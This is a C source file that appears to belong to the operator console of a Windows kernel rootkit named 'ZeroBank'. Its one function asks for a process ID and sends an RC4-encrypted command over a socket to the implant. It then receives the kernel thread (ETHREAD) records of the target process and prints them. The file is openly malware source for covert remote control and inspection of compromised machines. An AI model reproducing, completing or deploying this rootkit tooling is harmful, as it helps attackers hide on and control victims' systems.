#include "server_globals.h"

BOOL rootkit_get_process_ethread(IN SOCKET sock, IN BYTE PacketType)
{
	ZEROBANK_PACKET_TYPE type = { 0 };
	INT sendsize = 0;
	INT getsize = 0;
	INT recvsize = 0;
	INT offset = 0;
	INT amount = 0;
	PVOID Out = NULL;
	BOOL ret;
	PROOTKIT_THREAD_ENTRY ThreadEntry = NULL, Entry = NULL;
	ULONG NumberOfThreads = NULL;

	char *ethread = "Ethread";
	char *StartAddress = "StartAddress";
	char *ContextSwitches = "ContextSwitches";
	char *StackResident = "KernelStackResident";
	char *id = "ThreadId";
	char *time = "CreateTime";
	char *ktime = "Kerneltime";

	printf("\r\n{ ETHREAD-PLUGIN } Introduce ProcessID-> ");
	scanf("%d", &type.ProcessId_For_ETHREAD_plugin);
	type.PacketType = PacketType;

	sendsize = send_packet_encrypted(sock, RC4_KEY_2, (PZEROBANK_PACKET_TYPE)&type, sizeof(ZEROBANK_PACKET_TYPE));
	if (sendsize > 0)
	{
		recvsize = recv(sock, (char*)&getsize, sizeof(INT), 0);
		if (recvsize > 0 && getsize > 0)
		{
			
			Out = recv_decrypted(sock, RC4_KEY_2, (PROOTKIT_THREAD_ENTRY)Entry, getsize);
			if (Out != NULL)
			{
				ThreadEntry = (PROOTKIT_THREAD_ENTRY)Out;
				if (ThreadEntry)
				{
					NumberOfThreads = getsize / sizeof(ROOTKIT_THREAD_ENTRY);

					printf("\r\n");
					printf("\r\n%s \t%s %10s %15s %11s %25s %20s", ethread, StartAddress, ContextSwitches, StackResident, id, time, ktime);
					printf("\r\n");

					for (ULONG i = 0; i < NumberOfThreads; i++, ThreadEntry++)
					{

						printf("\r\n0x%p", ThreadEntry->Ethread);
						printf("\t0x%p", ThreadEntry->StartAddress);
						printf("%10d", ThreadEntry->ContextSwitches);
						printf("%15s", ThreadEntry->KernelStackResident ? "Yes" : "No");
						printf("%20lu", ThreadEntry->ThreadId);
						printf("%35s", ThreadEntry->ThreadCreationTime);
						printf("%20u", ThreadEntry->KernelTime);

						ret = TRUE;

					}
				}
				RtlFreeHeap(GetProcessHeap(), 0, Out);
				Out = NULL;
			}
		}
	}
	else
	{
		ret = FALSE;
	}

	return ret;
}